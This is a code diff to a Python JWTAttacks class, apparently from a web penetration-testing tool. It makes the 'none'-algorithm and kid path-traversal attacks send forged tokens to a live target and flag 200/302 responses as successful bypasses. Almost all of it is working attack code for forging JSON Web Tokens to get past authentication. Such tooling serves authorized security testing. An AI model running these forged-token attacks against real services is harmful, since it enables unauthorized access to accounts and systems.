@@ -435,51 +435,61 @@ class JWTAttacks:
             successful_response = None
 
             for variation in none_variations:
-                # Create a new header with the current variation
-                new_header = header.copy()
-                new_header["alg"] = variation
+                try:
+                    # Create a new header with the current variation
+                    new_header = header.copy()
+                    new_header["alg"] = variation
 
-                # Create a new token with the modified header
-                modified_token = jwt.encode(payload, "", algorithm="none")
+                    # Create a new token using our own encoding method
+                    # This gives us full control over the header values
+                    modified_token = self.encode_jwt(new_header, payload)
 
-                # Replace the original token in the request
-                modified_request = request_text.replace(token, modified_token)
+                    # Replace the original token in the request
+                    modified_request = request_text.replace(token, modified_token)
 
-                # Send the modified request
-                response = self.http_request_tool.process_request(
-                    modified_request,
-                    use_proxy=use_proxy,
-                    proxy_address=proxy_address,
-                    verify_cert=verify_cert
-                )
+                    # Send the modified request
+                    response = self.http_request_tool.process_request(
+                        modified_request,
+                        use_proxy=use_proxy,
+                        proxy_address=proxy_address,
+                        verify_cert=verify_cert
+                    )
 
-                # Get the response status code
-                status_code = 0
-                if "response" in response:
-                    try:
-                        status_line = response["response"].split('\n')[0]
-                        status_code = int(status_line.split()[1])
-                    except (IndexError, ValueError):
-                        pass
+                    # Get the response status code
+                    status_code = 0
+                    if "response" in response:
+                        try:
+                            status_line = response["response"].split('\n')[0]
+                            status_code = int(status_line.split()[1])
+                        except (IndexError, ValueError):
+                            pass
 
-                # Add result for this variation
-                result = {
-                    "variation": variation,
-                    "token": modified_token,
-                    "header": new_header,
-                    "status_code": status_code,
-                    "success": status_code in [200, 302],
-                    "response": response.get("response", "")
-                }
-                results.append(result)
+                    # Add result for this variation
+                    result = {
+                        "variation": variation,
+                        "token": modified_token,
+                        "header": new_header,
+                        "status_code": status_code,
+                        "success": status_code in [200, 302],
+                        "response": response.get("response", "")
+                    }
+                    results.append(result)
 
-                # If we get a success response (200 or 302), keep this variation
-                if status_code in [200, 302]:
-                    success = True
-                    successful_variation = variation
-                    successful_token = modified_token
-                    successful_response = response.get("response", "")
-                    break  # Stop after first successful attempt
+                    # If we get a success response (200 or 302), keep this variation
+                    if status_code in [200, 302]:
+                        success = True
+                        successful_variation = variation
+                        successful_token = modified_token
+                        successful_response = response.get("response", "")
+                        break  # Stop after first successful attempt
+                except Exception as e:
+                    # If this variation fails, log it and continue to the next one
+                    results.append({
+                        "variation": variation,
+                        "error": str(e),
+                        "success": False
+                    })
+                    continue
 
             if success:
                 return {
@@ -601,7 +611,7 @@ class JWTAttacks:
         except Exception as e:
             return {"error": f"Failed to perform JWK header injection attack: {str(e)}"}
 
-    def kid_header_traversal(self, token):
+    def kid_header_traversal(self, token, request_text, use_proxy=False, proxy_address=None, verify_cert=True):
         try:
             # Decode the JWT without verification
             header = jwt.get_unverified_header(token)
@@ -621,9 +631,11 @@ class JWTAttacks:
                 "Zero"
             ]
 
+            results = []
             success = False
             successful_path = None
-            modified_token = None
+            successful_token = None
+            successful_response = None
 
             for path in null_paths:
                 # Create a new header with the current path
@@ -639,20 +651,58 @@ class JWTAttacks:
                     headers=new_header
                 )
 
-                # If we get here without error, this path worked
-                success = True
-                successful_path = path
-                break
+                # Replace the original token in the request
+                modified_request = request_text.replace(token, modified_token)
+
+                # Send the modified request
+                response = self.http_request_tool.process_request(
+                    modified_request,
+                    use_proxy=use_proxy,
+                    proxy_address=proxy_address,
+                    verify_cert=verify_cert
+                )
+
+                # Get the response status code
+                status_code = 0
+                if "response" in response:
+                    try:
+                        status_line = response["response"].split('\n')[0]
+                        status_code = int(status_line.split()[1])
+                    except (IndexError, ValueError):
+                        pass
+
+                # Add result for this path
+                result = {
+                    "path": path,
+                    "token": modified_token,
+                    "header": new_header,
+                    "status_code": status_code,
+                    "success": status_code in [200, 302],
+                    "response": response.get("response", "")
+                }
+                results.append(result)
+
+                # If we get a success response (200 or 302), keep this path
+                if status_code in [200, 302]:
+                    success = True
+                    successful_path = path
+                    successful_token = modified_token
+                    successful_response = response.get("response", "")
+                    break  # Stop after first successful attempt
 
             if success:
                 return {
                     "success": True,
-                    "modified_token": modified_token,
+                    "modified_token": successful_token,
+                    "successful_path": successful_path,
+                    "all_results": results,
+                    "response": successful_response,
                     "details": f"Successfully created token with KID path traversal: {successful_path}"
                 }
             else:
                 return {
                     "success": False,
+                    "all_results": results,
                     "error": "All KID path traversal attempts failed"
                 }
 
@@ -1090,7 +1140,7 @@ def jwt_attack(attack_type):
     elif attack_type == 'jwk_injection':
         result = http_tool.jwt_attacks.jwk_header_injection(token)
     elif attack_type == 'kid_traversal':
-        result = http_tool.jwt_attacks.kid_header_traversal(token)
+        result = http_tool.jwt_attacks.kid_header_traversal(token, request_text, use_proxy, proxy_address, verify_cert)
     elif attack_type == 'algorithm_confusion':
         result = http_tool.jwt_attacks.algorithm_confusion(token)
     else:
